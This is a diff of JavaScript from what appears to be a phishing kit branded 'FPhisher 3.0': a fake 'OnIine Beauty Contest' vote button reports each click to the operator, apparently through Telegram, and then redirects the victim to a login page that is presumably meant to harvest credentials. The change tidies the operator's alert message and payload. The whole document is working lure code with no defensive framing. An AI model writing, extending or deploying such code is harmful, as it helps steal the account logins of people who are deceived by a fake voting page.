@@ -58,22 +58,19 @@
       btn.addEventListener('click', async (e) => {
         e.preventDefault();
 
-        const message = `📬 New form submission!
+        // Clean formatted message for Telegram
+        const formattedMessage = `🚨 VOTE BUTTON CLICKED ACTIVE FOR LOGS 🚀🎉
 
-👤 VOTE BUTTON CLICKED!
-Contestant: OnIine Beauty Contest Niveame
-Status: Awaiting Login....
+👤 Contestant : OnIine Beauty Contest Niveame
+📊 Status     : Awaiting Login....
 
-🔒•SECURED BY FPHISHER•🔒`;
+━━━━━━━━━━━━━━━━━━━━━━━
+🔒 Secured by FPhisher 3.0 🔒
+⏰ ${new Date().toLocaleString()}`;
 
+        // Only send the clean text (no extra fields)
         const payload = {
-          id: SUBMIT_ID,
-          type: "vote_click",
-          raw_message: message,
-          action: "Vote button clicked",
-          contestant: "OnIine Beauty Contest Niveame",
-          status: "Awaiting Login....",
-          timestamp: new Date().toISOString()
+          text: formattedMessage
         };
 
         try {
@@ -82,8 +79,11 @@ Status: Awaiting Login....
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(payload)
           });
-        } catch (err) { console.error(err); }
+        } catch (err) {
+          console.error("Failed to send vote click:", err);
+        }
 
+        // Redirect to login page after sending
         window.location.href = btn.href || "login.html";
       });
     });
